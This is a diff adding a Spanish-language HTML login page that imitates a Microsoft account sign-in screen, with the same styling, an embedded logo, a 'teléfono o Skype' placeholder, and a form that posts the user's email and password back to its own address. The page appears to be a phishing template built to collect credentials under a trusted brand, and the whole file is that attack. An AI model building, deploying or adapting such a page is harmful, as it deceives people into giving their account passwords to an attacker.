@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar de seseón en la cuenta</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            box-sizing: border-box;
+            color: #1b1b1b;
+        }
+
+        html {
+            font-size: 62.5%;
+        }
+
+        body {
+            position: absolute;
+            width: 100%;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            max-width: 440px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            position: relative;
+            min-width: 320px;
+            min-height: 338px;
+            overflow: hidden;
+            box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .title {
+            color: #1b1b1b;
+            font-size: 2.4rem;
+            font-weight: 600;
+            padding: 0;
+            margin-top: 16px;
+            margin-bottom: 12px;
+        }
+
+        .field {
+            width: 100%;
+        }
+
+        .field input {
+            width: 100%;
+            height: 36px;
+            padding: 6px 10px;
+            border-width: 1px;
+            outline: none;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        p {
+            margin-bottom: 16px;
+            font-size: 1.3rem;
+        }
+
+        p a {
+            text-decoration: none;
+            color: #0067b8;
+        }
+
+        p a:hover {
+            color: #666;
+            text-decoration: underline;
+        }
+
+        .actionButton {
+            margin-top: 35px;
+            display: flex;
+            justify-content: right;
+        }
+
+        .actionButton button {
+            padding: 4px 12px 4px 12px;
+            text-align: center;
+            width: 108px;
+            height: 32px;
+            border-radius: 0;
+            border: none;
+            font-size: 1.5rem;
+            background-color: #0067b8;
+            color: white;
+        }
+
+        .actionButton button:first-child {
+            margin-right: 10px;
+            background-color: #d3d2d2;
+            color: inherit;
+        }
+
+        .actionButton button:hover {
+            background-color: #004d88;
+        }
+
+        .actionButton button:first-child:hover {
+            background-color: #c0c0c0;
+        }
+
+        .background {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            background: rgb(224, 222, 214);
+            background: linear-gradient(315deg, rgba(224, 222, 214, 1) 4%, rgba(221, 227, 220, 1) 34%, rgba(220, 222, 231, 1) 65%, rgba(224, 208, 208, 1) 93%);
+        }
+        .logo img {
+          width: 40%;
+        }
+
+        .next{
+          padding: 4px 12px 4px 12px;
+            text-align: center;
+            width: 108px;
+            height: 32px;
+            border-radius: 0;
+            border: none;
+            font-size: 1.5rem;
+            background-color: #0067b8;
+            color: white;
+        } 
+        
+        .next:hover{
+          background-color: #004d88;
+        }
+    </style>
+
+</head>
+
+<body>  
+    <div class="background">
+        <div class="container">
+            <div class="logo">
+               <img src="data:image/png;base64,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">
+            </div>
+            <div class="title">Iniciar sesión</div>
+            <form method="POST"  >
+                <div class="field">
+                    <input type="email" name="user" placeholder="Correo electrónico, teléfono o Skype" required>
+                    <input type="password" name="password" placeholder="Contraseña" required>
+                </div>
+                
+                <p>¿No tiene una cuenta? <a href="">Cree una</a>.</p>
+                <p><a href="">¿No puede acceder a su cuenta?</a></p>
+                <div class="actionButton">
+                    <button>Atrás</button>
+                    <input  class="next" type="submit" value="Siguiente" >
+                </div>
+
+
+                <form>
+
+           
+        </div>
+    </div>
+ 
+
+
+</body>
+
+</html>
